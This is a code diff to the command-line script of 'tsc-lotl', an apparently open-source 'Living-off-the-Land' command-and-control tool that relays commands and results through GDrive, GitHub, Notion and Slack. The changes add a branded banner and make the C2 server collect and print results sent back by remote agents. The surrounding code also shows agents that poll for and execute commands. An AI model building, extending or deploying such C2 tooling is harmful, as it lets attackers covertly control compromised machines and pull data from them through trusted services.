@@ -8,9 +8,24 @@ const LotlC2 = require('../src/lotl-c2');
 const argv = minimist(process.argv.slice(2));
 const cmd = argv._[0];
 
+function showBanner() {
+  console.log('');
+  console.log('  ████████╗███████╗ ██████╗     ██╗      ██████╗ ████████╗██╗');
+  console.log('  ╚══██╔══╝██╔════╝██╔════╝     ██║     ██╔═══██╗╚══██╔══╝██║');
+  console.log('     ██║   █████╗  ██║          ██║     ██║   ██║   ██║   ██║');
+  console.log('     ██║   ██╔══╝  ██║          ██║     ██║   ██║   ██║   ██║');
+  console.log('     ██║   ███████╗╚██████╗     ███████╗╚██████╔╝   ██║   ██║');
+  console.log('     ╚═╝   ╚══════╝ ╚═════╝     ╚══════╝ ╚═════╝    ╚═╝   ╚═╝');
+  console.log('  ┌─────────────────────────────────────────────────────────────────┐');
+  console.log('  │     Living-off-the-Land C2 — GDrive · GitHub · Notion · Slack  │');
+  console.log('  │     tsc-lotl v1.0.1 — github.com/SURUJ404/Zero-proof           │');
+  console.log('  └─────────────────────────────────────────────────────────────────┘');
+  console.log('');
+}
+
 function showHelp() {
-  console.log(`
-tsc-lotl — Living-off-the-Land C2 Tool  v1.0.0
+  showBanner();
+  console.log(`tsc-lotl — Living-off-the-Land C2 Tool  v1.0.1
 
 Usage:
   tsc-lotl server --config <path>          Start C2 server listening on all channels
@@ -76,21 +91,27 @@ async function listChannels(configPath) {
 }
 
 async function runServer(configPath) {
+  showBanner();
   const c2 = new LotlC2(configPath);
   console.log('[tsc-lotl] C2 Server started');
   console.log(`[tsc-lotl] Channels: ${c2.channelPriority.filter(ch => c2.channels[ch]).join(', ')}`);
   console.log('[tsc-lotl] Listening for agent commands...');
 
-  const activeChannels = c2.channelPriority.filter(ch => c2.channels[ch]);
+  const activeChannels = c2.channelPriority.filter(ch => c2.channels[ch] && typeof c2.channels[ch].pollResults === 'function');
 
   const pollInterval = setInterval(async () => {
     for (const ch of activeChannels) {
       const status = c2.channelStatus[ch];
       const display = status === 'up' ? '✓' : status === 'down' ? '✗' : '?';
-      process.stdout.write(`\r[${display}] ${ch} — polling for results... `);
+      process.stdout.write(`\r[${display}] ${ch} — polling for results...   \n`);
     }
 
-    // Check for results on all channels (this would be expanded in a real server)
+    const allResults = await c2.pollAllResults();
+    for (const item of allResults) {
+      const ts = item.timestamp ? new Date(item.timestamp).toLocaleTimeString() : '?';
+      console.log(`[${ts}] [${item.channel}] Result from ${item.agentId}:`);
+      console.log(`  ${item.result}`);
+    }
   }, 30000);
 
   process.on('SIGINT', () => {
@@ -104,6 +125,7 @@ async function runServer(configPath) {
 }
 
 async function runAgent(configPath, agentId) {
+  showBanner();
   const c2 = new LotlC2(configPath);
   console.log(`[tsc-lotl] Agent "${agentId}" started`);
   console.log('[tsc-lotl] Polling all channels for commands...');
@@ -154,6 +176,7 @@ function executeCommand(cmd) {
 }
 
 async function sendCommand(configPath, channel, agentId, command) {
+  showBanner();
   const c2 = new LotlC2(configPath);
   try {
     const result = await c2.sendCommand(channel, agentId, command);
